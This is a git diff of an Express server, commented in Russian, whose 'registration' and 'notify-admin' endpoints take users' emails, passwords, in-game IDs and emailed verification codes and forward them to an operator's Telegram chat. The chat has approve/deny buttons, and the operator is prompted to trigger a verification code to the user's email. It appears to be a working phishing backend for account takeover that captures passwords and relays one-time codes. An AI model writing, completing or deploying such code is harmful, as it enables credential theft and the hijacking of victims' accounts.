@@ -1,4 +1,5 @@
-// server/index.js
+// server.js (COMMONJS)
+
 const path = require("path");
 const express = require("express");
 
@@ -6,7 +7,7 @@ const app = express();
 
 // ===== ENV =====
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
-const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // например "123456789"
+const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID; // твой chat id
 const PORT = process.env.PORT || 3000;
 
 if (!TELEGRAM_BOT_TOKEN) {
@@ -24,7 +25,7 @@ const TELEGRAM_API = TELEGRAM_BOT_TOKEN
 app.use(express.json());
 
 // статика: /public (index.html, soon.html, картинки и т.д.)
-const PUBLIC_DIR = path.join(__dirname, "..", "public");
+const PUBLIC_DIR = path.join(__dirname, "public");
 app.use(express.static(PUBLIC_DIR));
 
 // health-check для Render
@@ -32,7 +33,7 @@ app.get("/healthz", (req, res) => {
   res.json({ ok: true });
 });
 
-// опционально: корень сайта
+// корневой маршрут
 app.get("/", (req, res) => {
   res.sendFile(path.join(PUBLIC_DIR, "index.html"));
 });
@@ -71,11 +72,8 @@ function sendTelegramMessage(chatId, text, extra = {}) {
   });
 }
 
-// ===== API: notify-admin =====
-//
-// фронт вызывает notifyAdmin("email_code_request", payload)
-// или notifyAdmin("full_application_fallback", formData)
-//
+// ===== API: /api/notify-admin =====
+
 app.post("/api/notify-admin", async (req, res) => {
   const {
     type,
@@ -92,7 +90,7 @@ app.post("/api/notify-admin", async (req, res) => {
 
   try {
     if (type === "email_code_request") {
-      // ВАЖНО: сюда добавляем password, чтобы он был в первом сообщении
+      // ПЕРВОЕ сообщение: сразу с паролем
       const text =
         "✉️ <b>Email code request</b>\n" +
         "\nType: <code>email_code_request</code>" +
@@ -102,7 +100,6 @@ app.post("/api/notify-admin", async (req, res) => {
         `\nPassword: <code>${password || "-"}</code>` +
         "\n\n⬆️ Проверь данные и отправь пользователю верификационный код на почту.";
 
-      // Клавиатура чисто для тебя в ТГ; сайт от неё не зависит
       const replyMarkup = {
         inline_keyboard: [
           [
@@ -121,7 +118,6 @@ app.post("/api/notify-admin", async (req, res) => {
     }
 
     if (type === "full_application_fallback") {
-      // если /api/submit-registration упал, фронт шлёт сюда полную заявку
       const text =
         "⚠️ <b>Registration application (fallback)</b>\n" +
         "\nType: <code>full_application_fallback</code>" +
@@ -141,7 +137,6 @@ app.post("/api/notify-admin", async (req, res) => {
       return res.json({ ok: tgRes.ok });
     }
 
-    // на будущее, если появятся другие типы
     const text =
       "ℹ️ <b>Unknown notify-admin type</b>\n" +
       `\nType: <code>${type}</code>` +
@@ -162,11 +157,8 @@ app.post("/api/notify-admin", async (req, res) => {
   }
 });
 
-// ===== API: submit-registration =====
-//
-// фронт шлёт сюда основную заявку:
-// { accessCode, ingameId, email, password, emailCode }
-//
+// ===== API: /api/submit-registration =====
+
 app.post("/api/submit-registration", async (req, res) => {
   const { accessCode, ingameId, email, password, emailCode } = req.body || {};
 
@@ -207,9 +199,7 @@ app.post("/api/submit-registration", async (req, res) => {
       return res.status(500).json({ ok: false, error: "telegram_error" });
     }
 
-    // можно сгенерить какой-нибудь ID заявки, если хочешь
     const uid = String(Date.now());
-
     return res.json({ ok: true, status: "ok", uid });
   } catch (err) {
     console.error("[/api/submit-registration] error:", err);
@@ -218,10 +208,7 @@ app.post("/api/submit-registration", async (req, res) => {
 });
 
 // ===== TELEGRAM WEBHOOK =====
-//
-// Нужен, чтобы inline-кнопки APPROVE / DENY хоть что-то делали
-// (только в Telegram, сайт не трогают).
-//
+
 app.post("/telegram/webhook", async (req, res) => {
   const update = req.body;
 
@@ -233,7 +220,6 @@ app.post("/telegram/webhook", async (req, res) => {
       const messageId = cq.message.message_id;
 
       if (data === "APPROVE_EMAIL") {
-        // убрать клавиатуру и написать коммент
         await telegramRequest("editMessageReplyMarkup", {
           chat_id: chatId,
           message_id: messageId,
@@ -281,7 +267,6 @@ app.post("/telegram/webhook", async (req, res) => {
     console.error("[/telegram/webhook] error:", err);
   }
 
-  // Всегда 200, иначе Telegram будет ретраить
   res.sendStatus(200);
 });
 
